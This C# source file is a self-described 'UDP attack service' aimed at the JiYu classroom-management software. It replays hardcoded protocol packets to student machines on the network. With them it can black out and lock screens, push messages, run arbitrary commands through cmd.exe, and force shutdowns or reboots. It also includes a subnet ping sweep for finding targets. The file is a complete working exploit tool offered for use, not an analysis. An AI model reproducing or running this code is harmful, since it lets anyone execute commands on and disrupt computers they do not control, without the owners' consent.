using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace UdpGhost.Services
{
    /// <summary>
    /// 极域UDP攻击服务 - 完整移植自主程序 UdpAttackService
    /// </summary>
    public class GhostService
    {
        private const int MAIN_PORT = 4705;
        private const string SESSION_MCAST_PREFIX = "225.2";
        private const int SESSION_BASE_PORT = 5000;
        private const int SESSION_PORT_STRIDE = 0x200;

        // ========== 原项目4个硬编码基础包 (DMOC协议) ==========
        private static readonly byte[][] BasePackets = new byte[][]
        {
            // MSG
            new byte[]
            {
                0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x9e,0x03,0x00,0x00,0x10,0x41,0xaf,0xfb,
                0xa0,0xe7,0x52,0x40,0x91,0xdc,0x27,0xa3,0xb6,0xf9,0x29,0x2e,0x20,0x4e,0x00,0x00,
                0xc0,0xa8,0x50,0x81,0x91,0x03,0x00,0x00,0x91,0x03,0x00,0x00,0x00,0x08,0x00,0x00,
                0x00,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            },
            // CMD
            new byte[]
            {
                0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x6e,0x03,0x00,0x00,0x39,0x8e,0xd2,0x7c,
                0x8b,0x56,0x0d,0x45,0x9c,0x60,0xe0,0xd0,0xc4,0xa4,0xb3,0xf2,0x20,0x4e,0x00,0x00,
                0xc0,0xa8,0x50,0x81,0x61,0x03,0x00,0x00,0x61,0x03,0x00,0x00,0x00,0x02,0x00,0x00,
                0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x43,0x00,0x3a,0x00,
                0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,
                0x5c,0x00,0x73,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x6d,0x00,0x33,0x00,
                0x32,0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x63,0x00,0x6d,0x00,0x64,0x00,
                0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            },
            // REBOOT
            new byte[]
            {
                0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x2a,0x02,0x00,0x00,0xbf,0x40,0x22,0x4e,
                0x57,0x2d,0x3e,0x4f,0x9b,0x6f,0xc1,0x8d,0xe1,0xeb,0x4f,0x62,0x20,0x4e,0x00,0x00,
                0xc0,0xa8,0x50,0x81,0x1d,0x02,0x00,0x00,0x1d,0x02,0x00,0x00,0x00,0x02,0x00,0x00,
                0x00,0x00,0x00,0x00,0x13,0x00,0x00,0x10,0x0f,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x59,0x65,0x08,0x5e,0x06,0x5c,0xcd,0x91,0x2f,0x54,0xa8,
                0x60,0x84,0x76,0xa1,0x8b,0x97,0x7b,0x3a,0x67,0x02,0x30,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            },
            // SHUTDOWN
            new byte[]
            {
                0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x2a,0x02,0x00,0x00,0xc8,0xe3,0x97,0xfd,
                0xc0,0xb5,0x9f,0x45,0x87,0x72,0x05,0xbd,0x4e,0x46,0xa8,0x96,0x20,0x4e,0x00,0x00,
                0xc0,0xa8,0x50,0x81,0x1d,0x02,0x00,0x00,0x1d,0x02,0x00,0x00,0x00,0x02,0x00,0x00,
                0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x10,0x0f,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x59,0x65,0x08,0x5e,0x06,0x5c,0x73,0x51,0xed,0x95,0xa8,
                0x60,0x84,0x76,0xa1,0x8b,0x97,0x7b,0x3a,0x67,0x02,0x30,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            }
        };

        private const int PackBufferSize = 128;
        private const int SendBufferSize = 1024;
        private const int BasePackMsg = 0;
        private const int BasePackCmd = 1;
        private const int BasePackReboot = 2;
        private const int BasePackShutdown = 3;

        public static string GetSessionMcast(int channel) => $"{SESSION_MCAST_PREFIX}.{channel + 1}.1";
        public static int GetSessionPort(int channel) => SESSION_BASE_PORT + channel * SESSION_PORT_STRIDE;

        // ========== 黑屏 (MESS协议, 支持自定义文字) ==========
        public static string SendBlackscreen(string targetIp, int channel, bool lockInput = true, int timeout = 5, string text = null)
        {
            try
            {
                string mcast = GetSessionMcast(channel);
                int port = GetSessionPort(channel);
                byte[] mess = BuildBlackscreenMess(targetIp, lockInput, timeout, text);
                using (var udp = new UdpClient())
                {
                    udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                    udp.Send(mess, mess.Length, new IPEndPoint(IPAddress.Parse(mcast), port));
                }
                return $"黑屏 -> {targetIp}" + (text != null ? $" [{text}]" : "");
            }
            catch (Exception ex) { return $"黑屏失败 {targetIp}: {ex.Message}"; }
        }

        public static string SendUnlock(string targetIp, int channel)
        {
            try
            {
                string mcast = GetSessionMcast(channel);
                int port = GetSessionPort(channel);
                byte[] packet = BuildUnlockMess(targetIp);
                using (var udp = new UdpClient())
                {
                    udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                    udp.Send(packet, packet.Length, new IPEndPoint(IPAddress.Parse(mcast), port));
                }
                return $"解锁 -> {targetIp}";
            }
            catch (Exception ex) { return $"解锁失败 {targetIp}: {ex.Message}"; }
        }

        private static byte[] BuildBlackscreenMess(string targetIp, bool lockInput, int timeout, string text)
        {
            int hasText = string.IsNullOrEmpty(text) ? 0 : 1;
            byte[] textUtf16 = new byte[0];
            if (hasText == 1) textUtf16 = Encoding.Unicode.GetBytes(text + "\0");
            int totalLen = 39 + textUtf16.Length;

            using (var ms = new System.IO.MemoryStream())
            using (var bw = new System.IO.BinaryWriter(ms))
            {
                bw.Write((uint)0x5353454D);
                bw.Write((uint)1);
                bw.Write((uint)1);
                bw.Write(IPAddress.Parse(targetIp).GetAddressBytes());
                bw.Write((uint)totalLen);
                bw.Write((uint)0x20);
                bw.Write((uint)0x80000000);
                bw.Write((uint)(lockInput ? 1 : 0));
                bw.Write((uint)1);
                bw.Write((uint)timeout);
                bw.Write((uint)hasText);
                bw.Write((uint)0x0000FFFF);
                bw.Write((uint)0);
                if (hasText == 1) bw.Write(textUtf16);
                else bw.Write(new byte[] { 0xA0, 0x05, 0x20 });
                return ms.ToArray();
            }
        }

        private static byte[] BuildUnlockMess(string targetIp)
        {
            using (var ms = new System.IO.MemoryStream())
            using (var bw = new System.IO.BinaryWriter(ms))
            {
                bw.Write((uint)0x5353454D);
                bw.Write((uint)1);
                bw.Write((uint)1);
                bw.Write(IPAddress.Parse(targetIp).GetAddressBytes());
                bw.Write((uint)0x0D);
                bw.Write((uint)0x20);
                bw.Write((uint)0x90000000);
                bw.Write((byte)0x01);
                return ms.ToArray();
            }
        }

        // ========== 发消息 (DMOC协议) ==========
        public static string SendText(string ip, int messagePort, string message)
        {
            try
            {
                byte[] data = new byte[SendBufferSize];
                Array.Copy(BasePackets[BasePackMsg], data, PackBufferSize);
                byte[] msgBytes = Encoding.Unicode.GetBytes(message);
                int copyLen = Math.Min(msgBytes.Length, SendBufferSize - 56);
                Array.Copy(msgBytes, 0, data, 56, copyLen);
                using (var udp = new UdpClient())
                {
                    udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                    udp.Send(data, data.Length, new IPEndPoint(IPAddress.Parse(ip), MAIN_PORT));
                }
                return $"消息 -> {ip}: {message}";
            }
            catch (Exception ex) { return $"消息失败 {ip}: {ex.Message}"; }
        }

        // ========== 执行命令 (DMOC协议) ==========
        public static string SendCommand(string ip, int messagePort, string command)
        {
            try
            {
                byte[] data = new byte[SendBufferSize];
                Array.Copy(BasePackets[BasePackCmd], data, PackBufferSize);
                byte[] cmdBytes = Encoding.Unicode.GetBytes(command);
                int copyLen = Math.Min(cmdBytes.Length, SendBufferSize - 100);
                Array.Copy(cmdBytes, 0, data, 100, copyLen);
                using (var udp = new UdpClient())
                {
                    udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                    udp.Send(data, data.Length, new IPEndPoint(IPAddress.Parse(ip), MAIN_PORT));
                }
                return $"命令 -> {ip}: {command}";
            }
            catch (Exception ex) { return $"命令失败 {ip}: {ex.Message}"; }
        }

        // ========== 关机/重启 (DMOC协议) ==========
        public static string SendShutdown(string ip)
        {
            try
            {
                byte[] data = new byte[SendBufferSize];
                Array.Copy(BasePackets[BasePackShutdown], data, PackBufferSize);
                using (var udp = new UdpClient())
                {
                    udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                    udp.Send(data, data.Length, new IPEndPoint(IPAddress.Parse(ip), MAIN_PORT));
                }
                return $"关机 -> {ip}";
            }
            catch (Exception ex) { return $"关机失败 {ip}: {ex.Message}"; }
        }

        public static string SendReboot(string ip)
        {
            try
            {
                byte[] data = new byte[SendBufferSize];
                Array.Copy(BasePackets[BasePackReboot], data, PackBufferSize);
                using (var udp = new UdpClient())
                {
                    udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                    udp.Send(data, data.Length, new IPEndPoint(IPAddress.Parse(ip), MAIN_PORT));
                }
                return $"重启 -> {ip}";
            }
            catch (Exception ex) { return $"重启失败 {ip}: {ex.Message}"; }
        }

        public static System.Collections.Generic.List<string> ScanNetwork()
        {
            var hosts = new System.Collections.Generic.List<string>();
            try
            {
                string localIp = GetLocalIP();
                if (string.IsNullOrEmpty(localIp)) return hosts;
                string[] parts = localIp.Split('.');
                string subnet = $"{parts[0]}.{parts[1]}.{parts[2]}";
                System.Threading.Tasks.Parallel.For(1, 255, i =>
                {
                    try
                    {
                        using (var ping = new System.Net.NetworkInformation.Ping())
                        {
                            var reply = ping.Send($"{subnet}.{i}", 200);
                            if (reply.Status == System.Net.NetworkInformation.IPStatus.Success)
                                lock (hosts) { hosts.Add($"{subnet}.{i}"); }
                        }
                    }
                    catch { }
                });
            }
            catch { }
            return hosts;
        }

        public static string GetLocalIP()
        {
            try
            {
                using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                {
                    socket.Connect("8.8.8.8", 65530);
                    return (socket.LocalEndPoint as IPEndPoint).Address.ToString();
                }
            }
            catch { return "127.0.0.1"; }
        }


        public static System.Collections.Generic.List<SenderInfo> ScanSenders()
        {
            var list = new System.Collections.Generic.List<SenderInfo>();
            try
            {
                using (var client = new UdpClient(9100))
                {
                    client.Client.ReceiveTimeout = 3000;
                    var endPoint = new IPEndPoint(IPAddress.Any, 9100);
                    DateTime start = DateTime.Now;
                    while ((DateTime.Now - start).TotalSeconds < 3)
                    {
                        try
                        {
                            byte[] data = client.Receive(ref endPoint);
                            string msg = Encoding.UTF8.GetString(data);
                            string[] parts = msg.Split('|');
                            if (parts.Length >= 4 && parts[0] == "DV")
                            {
                                var info = new SenderInfo { MachineName = parts[1], IP = parts[2], Port = int.Parse(parts[3]) };
                                if (!list.Exists(s => s.IP == info.IP)) list.Add(info);
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
            return list;
        }
    }

    public class SenderInfo
    {
        public string MachineName { get; set; }
        public string IP { get; set; }
        public int Port { get; set; }
    }
}
